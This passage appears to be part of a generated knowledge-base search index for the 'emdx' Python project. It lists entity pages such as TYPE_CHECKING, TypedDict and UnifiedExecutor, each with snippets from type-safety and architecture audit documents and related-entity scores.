<code>cli_executor/</code> polymorphic JSON are correctly exempt per CLAUDE.md</p> </li> <li> <p>#6581 Delegate: Audit emdx/ui/ for methods with Any-typed parameters that co [2/3]   Section: 1. <code>activity/activity_items.py</code> \u2014 <code>doc_db: Any</code> parameter (6 occurrences)</p> <p>Fix: Use <code>TYPE_CHECKING</code> guard: ```python from future import annotations from typing import TYPE_CHECKING if TYPE_CHECKING:     from emdx.database import SQLiteDatabase</p> </li> <li> <p>#6562 Delegate: Remove vim_line_numbers and VimEditor dead code from the TUI   Section: Files Updated</p> </li> <li>Removed <code>VimEditorHost</code> protocol</li> <li>Removed <code>ExtendedVimEditorHost</code> protocol</li> <li>Simplified imports (removed <code>TYPE_CHECKING</code>, <code>Any</code>, <code>Input</code> type hint)</li> <li> <p>Kept <code>SelectionModeHost</code> protocol which is still in use</p> </li> <li> <p>#6518 Any removal Phase 1: Quick wins   Section: 3. Added TYPE_CHECKING guards for optional dependencies</p> <p>emdx/services/file_watcher.py:</p> </li> <li>Added <code>TYPE_CHECKING</code> import with <code>Observer</code> and <code>FileSystemEvent</code> types from watchdog</li> <li>Replaced <code>Any</code> type for <code>self.observer</code> with <code>Observer | None</code></li> <li> <p>Fixed <code>on_modified</code> event parame...</p> </li> <li> <p>#6516 Any removal Phase 4: Command/Model TypedDicts   Section: 1. <code>emdx/commands/compact.py</code></p> <p>Changes:</p> </li> <li>Added <code>TYPE_CHECKING</code> guard with numpy imports (<code>np</code>, <code>npt</code>)</li> <li>Created <code>CompactDocumentDict</code> TypedDict for document data:</li> <li> <p><code>id: int</code>, <code>title: str</code>, <code>content: str</code>, `project: str | Non...</p> </li> <li> <p>#6514 Any removal Phase 3: Protocols   Section: 4. Updated <code>emdx/ui/command_palette/palette_presenter.py</code></p> <ul> <li>Added <code>TYPE_CHECKING</code> import block with <code>UnifiedSearchService</code></li> </ul> </li> <li><code>_search_service: Any</code> to <code>_search_service: UnifiedSearchService | None</code></li> <li> <p><code>search_service</code> property return type: <code>Any</code> t...</p> </li> <li> <p>#6509 Any Type Removal Analysis [synthesis]   Section: Common Themes</p> <p>Recommendation: Use <code>TYPE_CHECKING</code> blocks: ```python from future import annotations from typing import TYPE_CHECKING</p> </li> <li> <p>#6508 Any Type Removal Analysis [synthesis]   Section: Common Patterns Identified</p> </li> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: emdx/commands/compact.py</p> <p>Alternative (without numpy dep in type stubs): ```python from typing import TYPE_CHECKING if TYPE_CHECKING:     from numpy.typing import NDArray     import numpy as np</p> </li> <li> <p>#6499 Any Type Removal Analysis [5/5]   Section: 3. <code>emdx/commands/distill.py</code></p> </li> <li> <p>#6493 Any Type Removal Analysis [2/5]   Section: 6. <code>emdx/ui/log_browser_navigation.py</code></p> <p>...t__(self, log_browser: Any)<code>|</code>log_browser: LogBrowser<code>| Always LogBrowser; use</code>TYPE_CHECKING` import to avoid circular |</p> </li> <li> <p>#6484 Any Type Removal Analysis [4/5]   Section: File: <code>emdx/services/ask_service.py</code></p> <p>Why:</p> </li> <li><code>_client</code> is assigned <code>anthropic.Anthropic()</code> at line 55</li> <li><code>_embedding_service</code> is assigned <code>EmbeddingService()</code> at line 63</li> <li> <p>Both are optional dependencies, so use <code>TYPE_CHECKING</code> block with string annotations or conditional imports</p> </li> <li> <p>#6235 Delegate: tech-debt,audit,comprehensive [12/14]   Section: \ud83d\udfe1 Medium Priority Issues</p> <p>Recommended Fix:</p> </li> <li>Use proper conditional typing with <code>TYPE_CHECKING</code></li> <li> <p>Or use <code>Optional[module]</code> patterns</p> </li> <li> <p>#6176 Delegate: Audit emdx/ui/ for dead TUI code. Check ALL ui/ files includ [5/17]   Section: 3. Empty TYPE_CHECKING Blocks (stale imports)</p> <p>Files with unused TYPE_CHECKING blocks:</p> </li> <li><code>emdx/ui/activity/activity_items.py:12-13</code> \u2014 <code>if TYPE_CHECKING: pass</code></li> <li><code>emdx/ui/activity/activity_tree.py:29-30</code> \u2014 <code>if TYPE_CHECKING: pass</code></li> </ul>"},{"location":"entities/typechecking/#emdxuiprotocolspy","title":"emdx/ui/protocols.py","text":""},{"location":"entities/typechecking/#2-lazy-loaded-services-typed-as-any-8-occurrences","title":"2. Lazy-loaded services typed as <code>Any</code> (8 occurrences)","text":"<p>Solution: Use <code>TYPE_CHECKING</code> imports with <code>ServiceType | None</code>: ```python from typing import TYPE_CHECKING if TYPE_CHECKING:     from .embedding_service import EmbeddingService</p>"},{"location":"entities/typechecking/#recommended","title":"Recommended","text":"<p>from ..services.synthesis_service import Audience  # move to top with TYPE_CHECKING</p>"},{"location":"entities/typechecking/#related-entities","title":"Related Entities","text":"<ul> <li><code>selectionmodehost</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>qa_presenter.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>paramspec</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>lower impact</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>log_browser*.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>kwargs: any</code> to `` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>vimeditorhost</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.5)</li> <li><code>**kwargs: object</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.5)</li> <li><code>protocols.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> <li><code>emdx/ui/inputs.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/typeddict/","title":"typeddict","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-14</p>"},{"location":"entities/typeddict/#documents-8","title":"Documents (8)","text":"<ul> <li>#6583 Delegate synthesis [synthesis]   Section: Production Code (<code>services/</code> + <code>ui/</code>) <p>...Any<code>-typed parameters** in</code>ui/` across 14 files</p> </li> <li>Most fixes are mechanical: add <code>TypedDict</code> definitions or <code>TYPE_CHECKING</code> guards</li> <li> <p>Textual widget <code>*args: Any, **kwargs: Any</code> and <code>cli_executor/</code> polymorphic JSON are correctly exempt per CLAUDE.md</p> </li> <li> <p>#6581 Delegate: Audit emdx/ui/ for methods with Any-typed parameters that co [2/3]   Section: 15. <code>keybindings/config.py:60,113,188</code> \u2014 <code>dict[str, Any]</code> for YAML config</p> <p>...ed YAML. Since YAML output is inherently untyped, this is acceptable as-is. A <code>TypedDict</code> could be defined but adds complexity for minimal gain on deserialized external input.</p> </li> <li> <p>#6509 Any Type Removal Analysis [synthesis]   Section: Common Themes</p> <p>Recommendation: Create TypedDicts in <code>emdx/ui/types.py</code> or <code>emdx/models/types.py</code>:</p> </li> <li><code>DocumentDict</code></li> <li><code>ExecutionData</code></li> <li><code>GroupDict</code></li> <li><code>CascadeRunDict</code></li> <li> <p><code>TagInfo</code></p> </li> <li> <p>#6485 Any Type Removal Analysis [3/5]   Section: Occurrence 2: ResultSelected.result dict</p> <p>Recommended Type: Custom <code>TypedDict</code></p> </li> <li> <p>#6433 Any/None typing audit [2/5]   Section: tasks.py</p> <p>Notes:</p> </li> <li><code>update_task(**kwargs: Any)</code>: Could use <code>TypedDict</code> with <code>Unpack</code> (Python 3.12+) or define explicit allowed types. Given <code>ALLOWED_UPDATE_COLUMNS</code> whitelist, a <code>TaskUpdateDict</code> TypedDict would be ideal.</li> <li> <p>SQL params:...</p> </li> <li> <p>#6310 Delegate: Analyze DATA FLOW &amp; STATE MANAGEMENT across emdx/ (exclude u [7/15]   Section: Recommendations</p> <p>...r dependency injection for database connection</p> </li> <li> <p>Type-hint row returns \u2014 Use <code>TypedDict</code> or dataclasses instead of <code>dict[str, Any]</code></p> </li> <li> <p>#6219 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: Critical Issues (8)</p> </li> </ul>"},{"location":"entities/typeddict/#3-duck-typed-database-rows-without-protocoltypeddict","title":"3. Duck-typed database rows without Protocol/TypedDict","text":"<p>File: <code>emdx/database/__init__.py:83-310</code> Issue: <code>SQLiteDatabase</code> methods return <code>dict</code> without specifying structure. Functions like <code>save_document()</code>, `get_d...</p>"},{"location":"entities/typeddict/#related-entities","title":"Related Entities","text":"<ul> <li><code>qa_presenter.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>paletteaction</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>lower impact</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>log_browser*.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>callable[[], none]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>zero mock specs = zero regression safety net</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>unspecced mocks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>typed parameters</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>type safety audit synthesis:</code>emdx/services/<code>,</code>emdx/ui/<code>, and</code>tests/` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>type safety audit synthesis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/typespy/","title":"types.py","text":"<p>Type: heading | Mentioned in: 9 documents | First seen: 2026-02-15</p>"},{"location":"entities/typespy/#documents-9","title":"Documents (9)","text":"<ul> <li> <p>#6432 Any/None typing audit [1/5]   Section: Summary</p> </li> <li> <p>#6863 Delegate: Audit docs/ folder: Read docs/cli-api.md, docs/architecture. [3/3]   Section: docs/architecture.md</p> <p>23. MISSING: Several command files not listed in file tree (lines 18-39) Missing from <code>commands/</code> listing:</p> </li> <li><code>explore.py</code> \u2014 knowledge base exploration</li> <li><code>types.py</code> \u2014 command type definitions</li> <li> <p><code>wrapup.py</code> \u2014 (legacy? still exists as file)</p> </li> <li> <p>#6512 None Type Analysis [synthesis]   Section: Common Themes \u2014 Why Most <code>| None</code> Are Necessary</p> </li> <li><code>project: str | None</code> \u2014 Projects are optional</li> <li><code>deleted_at: datetime | None</code> \u2014 Only set when soft-deleted</li> <li> <p>`parent_id:...</p> </li> <li> <p>#6500 None Type Analysis [3/7]   Section: Potentially Unnecessary <code>| None</code> (Requires Investigation)</p> <p>...SQL columns that are nullable (confirmed by checking TypedDict definitions in <code>types.py</code> which mirror schema) - REQUIRED</p> </li> <li> <p>Intermediate variables that can be None during iteration (e.g., <code>_would_create_cycle</code> line 444) - REQUIRED</p> </li> <li> <p>#6433 Any/None typing audit [2/5]   Section: Files with NO Any usage</p> <ul> <li><code>documents.py</code> - Re-exports only, no function definitions</li> </ul> </li> <li><code>categories.py</code> - Uses only concrete types and cast()</li> <li><code>types.py</code> - TypedDict definitions only</li> <li> <p><code>__init__.py</code> - Re-exports only</p> </li> <li> <p>#6418 Type System Audit: Replace Any/None with Concrete Types [3/4]   Section: Recommendations</p> <ol> <li>Create a <code>types.py</code> module in each package with shared TypedDicts</li> </ol> </li> <li>Use TYPE_CHECKING imports for optional dependencies (watchdog, anthropic, sentence-transformers)</li> <li> <p>**Conside...</p> </li> <li> <p>#6415 Type System Audit: Replace Any/None with Concrete Types [2/4]   Section: Implementation Recommendations</p> <ol> <li>Create a <code>types.py</code> module in <code>emdx/database/</code> for all TypedDicts</li> </ol> </li> <li>Use <code>from __future__ import annotations</code> for forward references</li> <li> <p>Consider <code>TypedDict(total=False)</code> for...</p> </li> <li> <p>#6416 Type System Audit: Replace Any/None with Concrete Types [1/4]   Section: Recommendations</p> <ol> <li>Create a <code>types.py</code> module in <code>emdx/models/</code> with all TypedDicts</li> </ol> </li> <li>Core types to define:</li> <li><code>TaskDict</code> \u2014 used by ~10 functions</li> <li> <p><code>CategoryDict</code>, <code>CategoryWithStatsDict</code>...</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...ecessary</p> </li> <li>migrations.py: All necessary</li> <li>connection.py: All necessary</li> <li>types.py: All necessary (TypedDict definitions)</li> </ul>"},{"location":"entities/typespy/#typespy_1","title":"types.py","text":"<p>No <code>Any</code> usage \u2705 (defines TypedDicts, no function signatures)</p>"},{"location":"entities/typespy/#database-nullable-columns","title":"\u2705 Database Nullable Columns","text":"<p>All TypedDict definitions in <code>types.py</code> correctly mirror SQL schema nullability:</p>"},{"location":"entities/typespy/#related-entities","title":"Related Entities","text":"<ul> <li><code>create a</code>types.py<code>module</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>3. groups.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>1. documents.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>type system audit</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>search.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>params: list[any]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>suggested replacement</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>any type annotation audit</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>actionable recommendations</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>= none</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/unifiedexecutor/","title":"unifiedexecutor","text":"<p>Type: tech_term | Mentioned in: 17 documents | First seen: 2026-02-13</p>"},{"location":"entities/unifiedexecutor/#documents-17","title":"Documents (17)","text":"<ul> <li>#6585 Delegate: Remove any remaining references to 'cursor' or 'Cursor' in c [2/2]   Section: Files Modified <p>...ved <code>\"cursor\"</code> from inline comment on <code>cli_tool</code> field</p> </li> <li>Removed \"Cursor\" from <code>UnifiedExecutor</code> docstring</li> <li> <p>Removed \"(may be zero for Cursor)\" comment</p> </li> <li> <p>#6584 Delegate: Add missing all exports to emdx/services/cli_executor/__ [1/2]   Section: <code>emdx/services/__init__.py</code> \u2014 9 Symbols Added</p> <p>...<code>unified_executor</code> | <code>synthesis_service.py</code>, <code>tests/test_unified_executor.py</code> | | <code>UnifiedExecutor</code> | <code>unified_executor</code> | <code>synthesis_service.py</code>, <code>tests/test_unified_executor.py</code> |</p> </li> <li> <p>#6583 Delegate synthesis [synthesis]   Section: Test Suite</p> <p>...of 220+ mocks use <code>spec=</code>** \u2014 the most critical finding</p> </li> <li>5 core domain classes (<code>UnifiedExecutor</code>, <code>CliExecutor</code>, <code>SimilarityService</code>, <code>DistillService</code>, <code>psutil.Process</code>) are mocked without specs in high-traffic tests</li> <li> <p>A rename or signature change to any mocked...</p> </li> <li> <p>#6580 Delegate: Check tests/ for mocks that use MagicMock() where a spec= wo [3/3]   Section: P0 \u2014 HIGH RISK: Mocks of domain classes with evolving APIs</p> </li> <li>Files: <code>test_delegate_commands.py</code> (15+ instances), <code>test_unified_executor.py</code> (5 instances)</li> <li> <p>Risk: <code>UnifiedExecutor.execute()</code> is the core execution pat...</p> </li> <li> <p>#6567 Delegate synthesis [synthesis]   Section: 1. Architecture Overview</p> <p>...-| | CLI | <code>delegate.py</code> | Flag parsing, orchestration, synthesis | | Execution | <code>UnifiedExecutor</code> | Claude CLI invocation, streaming, metrics | | Isolation | Git worktrees | Per-task clean git state |</p> </li> <li> <p>#6566 Delegate: Review the UnifiedExecutor in emdx/services/unified_executor [2/3]   Section: Overview</p> <p>The <code>UnifiedExecutor</code> (<code>emdx/services/unified_executor.py</code>) is the core execution engine for EMDX's delegate system. It provides a unified interface for executing AI agent tasks with dif...</p> </li> <li> <p>#6565 Delegate: Look at the synthesis_service.py \u2014 how does --synthesize wor [3/3]   Section: Flow Summary</p> <p>...ute each task via _run_single()          \u2502       \u2502          \u2502       \u25bc          \u2502   UnifiedExecutor.execute() \u2192 Claude CLI          \u2502       \u2502          \u2502       \u25bc          \u2502   Agent output saved to KB \u2192 doc_id          \u2502          \u25bc     Collect all successful results...</p> </li> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: 1. Single Task Mode</p> <p>When exactly one task is provided:</p> </li> <li>Runs via <code>_run_single()</code> with <code>UnifiedExecutor</code></li> <li>Creates a task record before execution</li> <li>Builds an output instruction that tells the agent where to save results</li> <li> <p>Captures output and persists to knowledge base...</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 30 Migrations(!!) Creating Tables:</p> <p>This workflow system is ~2,000+ LOC in migrations alone yet the actual usage is minimal. The <code>delegate</code> command bypasses it entirely, using <code>UnifiedExecutor</code> directly.</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Strengths</p> </li> <li><code>UnifiedExecutor</code> abstracts Claude/Cursor differences</li> <li><code>EmbeddingService</code> handles semantic search</li> <li> <p><code>AskService</code> provides AI Q&amp;A interface</p> </li> <li> <p>#6324 Delegate: Architecture Improvement Analysis v0.14.0 [9/10]   Section: 2.1 Service Layer Consolidation (High Priority)</p> <p>Recommendation: </p> </li> <li>Create a <code>DocumentService</code> class that encapsulates all document operations</li> <li>Extract output formatting from <code>UnifiedExecutor</code> into <code>FormatService</code></li> <li> <p>Remove facade modules that only re-export (like <code>models/documents.py</code>)</p> </li> <li> <p>#6320 Delegate: Add comprehensive test coverage for the delegate command (em   Section: Test Coverage</p> </li> <li>Mocked <code>UnifiedExecutor</code> and <code>ExecutionResult</code> for isolated testing</li> <li>Mocked <code>subprocess.run</code> for discovery command tests</li> <li>Mocked <code>get_document</code> for document resolution tests</li> <li> <p>Mocked `emd...</p> </li> <li> <p>#6308 Delegate: Analyze API SURFACE &amp; CONCISENESS across emdx/ (exclude ui/  [10/15]   Section: 6. Service Interface Analysis</p> <p>Well-designed services:</p> </li> <li><code>UnifiedExecutor</code> - clean single interface for all execution</li> <li><code>EmbeddingService</code> - simple CRUD + search</li> <li> <p><code>AskService</code> - focused RAG implementation</p> </li> <li> <p>#6294 DEBT-19: Add missing test coverage for delegate command   Section: Test Coverage Added</p> <p>...- TestRunSingle (3 tests): Tests for <code>_run_single</code> - single task execution via UnifiedExecutor</p> </li> <li>TestRunParallel (4 tests): Tests for <code>_run_parallel</code> - parallel task execution including synthesize and worktree</li> <li> <p>TestRunChain (4 tests): Tests for `run...</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: How Delegate Uses These Systems</p> <p>...able (<code>_safe_create_task</code>)</p> </li> <li>Creates an execution in <code>executions</code> table (via <code>UnifiedExecutor</code>)</li> <li>Links task to execution by updating <code>tasks.execution_id</code></li> <li> <p>Updates task status with output_doc_id on completion</p> </li> <li> <p>#6154 Delegate: analysis [3/3]   Section: Design Patterns</p> </li> </ul>"},{"location":"entities/unifiedexecutor/#1-mock_executor-magicmock-standing-in-for-unifiedexecutor","title":"1. <code>mock_executor = MagicMock()</code> standing in for <code>UnifiedExecutor</code>","text":""},{"location":"entities/unifiedexecutor/#4-service-abstraction-for-ai-features","title":"4. Service Abstraction for AI Features","text":""},{"location":"entities/unifiedexecutor/#mocking-approach","title":"Mocking Approach","text":""},{"location":"entities/unifiedexecutor/#strategy-pattern","title":"Strategy Pattern","text":"<p><code>UnifiedExecutor</code> uses strategy pattern for different CLI tools (Claude, Cursor).</p>"},{"location":"entities/unifiedexecutor/#related-entities","title":"Related Entities","text":"<ul> <li><code>spec=</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>psutil.process</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>zero mock specs = zero regression safety net</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>worktree pooling</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>used by</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>unspecced mocks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>typed parameters</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>type safety audit synthesis:</code>emdx/services/<code>,</code>emdx/ui/<code>, and</code>tests/` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>type safety audit synthesis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>threadpoolexecutor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.2)</li> </ul>"},{"location":"entities/unifiedexecutorpy/","title":"unified_executor.py","text":"<p>Type: heading | Mentioned in: 19 documents | First seen: 2026-02-13</p>"},{"location":"entities/unifiedexecutorpy/#documents-19","title":"Documents (19)","text":"<ul> <li>#6494 None Type Analysis [5/7]   Section: None Type Analysis: Executor/CLI Service Files </li> <li><code>emdx/services/unified_executor.py</code></li> <li><code>emdx/services/cli_executor/base.py</code></li> <li><code>emdx/services/claude_executor.py</code></li> <li><code>emdx/services/cli_executor/cursor.py</code></li> <li><code>emdx/services/cli_executor/claude.py</code></li> <li> <p>`emd...</p> </li> <li> <p>#6434 Any/None typing audit [4/5]</p> <p>| Suggested Replacement | |----------|--------------|--------------|----------------------| | <code>MergeStrategy.preserve_metadata</code> | <code>dict[str, Any]</code> | \u26a0\ufe0f Partial | <code>MergeMetadata</code> TypedDict (has known shape) | | <code>_get_document_metadata()</code> | Return `dic...</p> </li> <li> <p>#6872 Delegate: Document #6864 (Delegate synthesis [synthesis]):</p> </li> </ul>"},{"location":"entities/unifiedexecutorpy/#analysis-scope","title":"Analysis Scope","text":"<p>Files analyzed:</p>"},{"location":"entities/unifiedexecutorpy/#synthes-34","title":"Synthes [3/4]","text":"<p>Section: 1. <code>emdx/config/constants.py</code> \u2014 38 dead constants</p> <p>...<code>EMDX_CONFIG_DIR</code> | 6 files (database, services, ui, utils) | | <code>EMDX_LOG_DIR</code> | <code>unified_executor.py</code> | | <code>DEFAULT_BROWSE_LIMIT</code> | <code>models/tasks.py</code> | | <code>DEFAULT_RECENT_LIMIT</code> | <code>models/tasks.py</code> | | <code>DEFAULT_TASK_PRIORITY</code> | <code>models/tasks.py</code> | | `DEFAULT_TAGGING_C...</p> <ul> <li> <p>#6758 Delegate: Research how to get progress/status information from a runni   Section: 2. <code>claude --print --output-format stream-json</code> \u2014 The Key Opportunity</p> <p>The UnifiedExecutor already does this (<code>unified_executor.py</code> lines 266-403): it uses <code>subprocess.Popen</code> + a background reader thread + <code>queue.Queue</code> to parse stream-json lines in real-time and write formatted logs to a file....</p> </li> <li> <p>#6708 Delegate: Analyze how running delegates are tracked in the database. R [3/4]   Section: What's Available for Running Delegates</p> <p>Only available after completion (set in <code>unified_executor.py</code> lines 474-487):</p> </li> <li><code>cost_usd</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code> \u2014 all written in a single <code>update_execution()</code> call after the process exits</li> <li> <p>`complete...</p> </li> <li> <p>#6601 Delegate: Fix PR #687 on branch delegate/add-a-typeddict-for-the-dict-   Section: Investigation</p> <p>The reported issue was that removing the <code>Any</code> import from <code>unified_executor.py</code> would cause <code>NameError</code> because <code>Any</code> is still used at runtime. After checking out the actual PR branch commit (<code>16ec39d</code>), I found:</p> </li> <li> <p>#6578 Delegate: List all TypedDicts defined in emdx/ and count how many file   Section: Remaining <code>Any</code> Hotspots to Address</p> <p>...hape varies</p> </li> <li><code>config/tagging_rules.py</code> \u2014 serialization/deserialization methods</li> <li><code>unified_executor.py</code> <code>to_dict()</code> \u2014 serialization (documented exception)</li> <li> <p>UI widget <code>*args: Any, **kwargs: Any</code> \u2014 Textual framework convention (documented exception)</p> </li> <li> <p>#6574 Delegate synthesis [synthesis]   Section: Key Findings</p> File Role <code>unified_executor.py</code> Claude CLI execution with real-time log streaming <code>unified_search.py</code> Hybrid search orchestrator (FTS5 + semantic + tags) <code>document_service.py</code> Clean... </li> <li> <p>#6572 Delegate: List the 3 most important files in emdx/services/ and say on [2/2]   Section: 3 Most Important Files in emdx/services/</p> </li> <li> <p>#6570 Delegate: Analyze the output capture and auto-save fallback in emdx/co [1/3]   Section: 1.1 Where Output Comes From</p> <p>``` Claude CLI (stream-json)     \u2193 UnifiedExecutor (unified_executor.py)     \u2193 cli_executor/claude.py:parse_output()     \u2193 CliResult.output  \u2192  result.output_content     \u2193 extract_output_doc_id() from log file     \u2193 _run_single() receive...</p> </li> <li> <p>#6512 None Type Analysis [synthesis]   Section: Key Findings</p> </li> <li><code>ProcResult.returncode: int | None</code> \u2014 Could be <code>int</code> (initialize to <code>-1</code>)</li> <li> <p><code>ExecutionResult.exit_code: int | None</code> \u2014 Could be <code>int = 0</code></p> </li> <li> <p>#6382 Codebase Bug Audit 2026-02-15 [synthesis]   Section: Files with Most Issues</p> <ol> <li><code>cascade.py</code> (commands + database) \u2014 12 issues</li> </ol> </li> <li><code>document_browser.py</code> \u2014 10 issues</li> <li><code>documents.py</code> \u2014 8 issues</li> <li><code>migrations.py</code> \u2014 6 issues</li> <li> <p><code>unified_executor.py</code> \u2014 5 issues</p> </li> <li> <p>#6336 Move execution utilities to services layer   Section: Move Execution Utilities to Services Layer</p> <p>They belong in 